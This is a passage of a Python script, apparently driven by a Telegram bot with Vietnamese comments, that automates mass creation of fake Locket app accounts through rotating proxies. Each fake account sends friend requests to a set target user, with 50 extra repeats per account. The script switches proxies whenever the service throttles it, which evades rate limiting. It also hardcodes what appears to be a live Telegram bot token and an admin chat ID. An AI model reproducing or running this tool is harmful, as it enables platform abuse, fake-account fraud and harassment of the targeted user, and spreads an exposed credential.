        '🌹', '🍒', '🍉', '🍔', '🍟', '☕', '🍷', '🎂', '🎁', '🎄', '🎃', '🔔',
        '⚡', '💡', '📚', '✈️', '🚗', '🏠', '⛰️', '🌊', '☀️', '☁️', '❄️', '🌙',
        '🐻', '🐼', '🐸', '🐝', '🦄', '🐙', '🦋', '🌸', '🌺', '🌴', '🏀', '⚽', '🎸'
    ], 5))
    username=_rand_name_()
    payload={
        "data": {
            "username": username,
            "last_name": last_name,
            "require_username": True,
            "first_name": first_name
        }
    }
    headers=config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=config.excute(
        f"{config.API_BASE_URL}/finalizeTemporaryUser",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Profile",
        proxies_dict=proxies_dict
    )
    if result:
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.GREEN}[✓] Profile created: {xColor.YELLOW}{username}")
        return True
    config._print(
        f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed")
    return False

def step3_send_friend_request(id_token, thread_id, proxies_dict):
    if not id_token:
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed: Invalid token")
        return False
    payload={
        "data": {
            "user_uid": config.TARGET_FRIEND_UID,
            "source": "signUp",
            "platform": "iOS",
            "messenger": "Messages",
            "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            "share_history_eligible": True,
            "rollcall": False,
            "prompted_reengagement": False,
            "create_ofr_for_temp_users": False,
            "get_reengagement_status": False
        }
    }
    headers=config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=config.excute(
        f"{config.API_BASE_URL}/sendFriendRequest",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Friend",
        proxies_dict=proxies_dict
    )
    if result:
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.GREEN}[✓] Connection established with target")
        return True
    config._print(
        f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed")
    return False

def step1_create_account(thread_id, proxy_queue, stop_event):
    while not stop_event.is_set():
        current_proxy=get_proxy(proxy_queue, thread_id, stop_event)
        proxies_dict=format_proxy(current_proxy)
        proxy_usage_count=0
        failed_attempts=0
        max_failed_attempts=10
        if not current_proxy:
            config._print(
                f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.RED}[!] Proxy pool depleted, waiting for refill (1s)")
            time.sleep(1)
            continue
        config._print(
            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.GREEN}● Thread activated with proxy: {xColor.YELLOW}{current_proxy}")

        while not stop_event.is_set() and proxy_usage_count < config.ACCOUNTS_PER_PROXY and failed_attempts < max_failed_attempts:
            if stop_event.is_set():
                return
            if not current_proxy:
                current_proxy=get_proxy(proxy_queue, thread_id, stop_event)
                proxies_dict=format_proxy(current_proxy)
                if not current_proxy:
                    config._print(
                        f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.RED}[!] Proxy unavailable, will try again")
                    break
                config._print(
                    f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.GREEN}● Switching to new proxy: {xColor.YELLOW}{current_proxy}")

            prefix=f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Register{Style.RESET_ALL}]"
            email=_rand_email_()
            password=_rand_pw_()
            config._print(
                f"{prefix} {xColor.CYAN}● Initializing new identity: {xColor.YELLOW}{email[:8]}...@...")
            payload={
                "data": {
                    "email": email,
                    "password": password,
                    "client_email_verif": True,
                    "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
                    "platform": "ios"
                }
            }
            if stop_event.is_set():
                return
            response_data=config.excute(
                f"{config.API_BASE_URL}/createAccountWithEmailPassword",
                headers=config.headers_locket(),
                payload=payload,
                thread_id=thread_id,
                step="Register",
                proxies_dict=proxies_dict
            )
            if stop_event.is_set():
                return
            if response_data == "proxy_dead":
                config._print(
                    f"{prefix} {xColor.RED}[!] Proxy terminated, acquiring new endpoint")
                current_proxy=None
                failed_attempts+=1
                continue
            if response_data == "too_many_requests":
                config._print(
                    f"{prefix} {xColor.RED}[!] Connection throttled, switching endpoint")
                current_proxy=None
                failed_attempts+=1
                continue
            if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
                config._print(
                    f"{prefix} {xColor.GREEN}[✓] Identity created: {xColor.YELLOW}{email}")
                proxy_usage_count+=1
                failed_attempts=0
                if stop_event.is_set():
                    return
                id_token=step1b_sign_in(
                    email, password, thread_id, proxies_dict)
                if stop_event.is_set():
                    return
                if id_token:
                    if step2_finalize_user(id_token, thread_id, proxies_dict):
                        if stop_event.is_set():
                            return
                        first_request_success=step3_send_friend_request(
                            id_token, thread_id, proxies_dict)
                        if first_request_success:
                            config._print(
                                f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Boost{Style.RESET_ALL}] {xColor.YELLOW}🚀 Boosting friend requests: Sending 50 more requests")
                            for _ in range(50):
                                if stop_event.is_set():
                                    return
                                step3_send_friend_request(
                                    id_token, thread_id, proxies_dict)
                            config._print(
                                f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Boost{Style.RESET_ALL}] {xColor.GREEN}[✓] Boost complete: 101 total requests sent")
                    else:
                        config._print(
                            f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failure")
                else:
                    config._print(
                        f"{prefix} {xColor.RED}[✗] Identity creation failed")
                failed_attempts+=1
        if failed_attempts >= max_failed_attempts:
            config._print(
                f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.RED}[!] Thread restarting: Excessive failures ({failed_attempts})")
        else:
            config._print(
                f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL}] {xColor.YELLOW}● Proxy limit reached ({proxy_usage_count}/{config.ACCOUNTS_PER_PROXY}), getting new proxy")

if __name__ == "__main__":
    # Đặt Bot Token của bạn ở đây
    BOT_TOKEN = "7875349256:AAFLKDJKuTijHWFZKzQLP315T0KtSg6NePQ"
    YOUR_ADMIN_CHAT_ID = "1615483759"  # Thay thế bằng chat ID của bạn

    config = zLocket()
    bot = telebot.TeleBot(BOT_TOKEN)
    
    # Setup bot handlers after bot initialization
    setup_bot_handlers()

    print(f"🤖 Bot đã khởi động! Token: {BOT_TOKEN[:10]}...")
    print(f"📱 Gửi /start cho bot để bắt đầu sử dụng")

    try:
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        print("\n⛔ Bot đã dừng!")
        if tool_running:
            tool_running = False
            if stop_event:
                stop_event.set()
